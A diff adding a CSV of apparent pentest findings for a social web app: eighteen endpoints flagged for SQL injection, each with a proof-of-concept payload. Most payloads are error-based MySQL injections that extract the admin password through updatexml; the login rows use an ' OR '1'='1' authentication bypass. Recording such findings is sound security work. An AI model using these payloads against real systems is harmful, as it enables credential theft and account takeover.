@@ -1,0 +1,19 @@
+run_id,endpoint,vulnerability,poc
+20260902-2313-0004,`/profile?username=`,SQL Injection,"`admin' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/friends?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/direct_messages?username=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/requests?username=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/edit_post?id=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/delete_post?id=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/login` POST `username`,SQL Injection / Auth Bypass,`' OR '1'='1' -- `
+20260902-2313-0004,`/login` POST `password`,SQL Injection,`' OR '1'='1' -- `
+20260902-2313-0004,`/signup` POST `username`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/signup` POST `password`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/signup` POST `name`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/create_post` POST `content`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/request_friend` POST `username`,SQL Injection (Blind),"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/remove_request` POST `username`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/direct_messages` POST `username`,SQL Injection (Blind),"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/settings` POST `name`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/settings` POST `bio`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
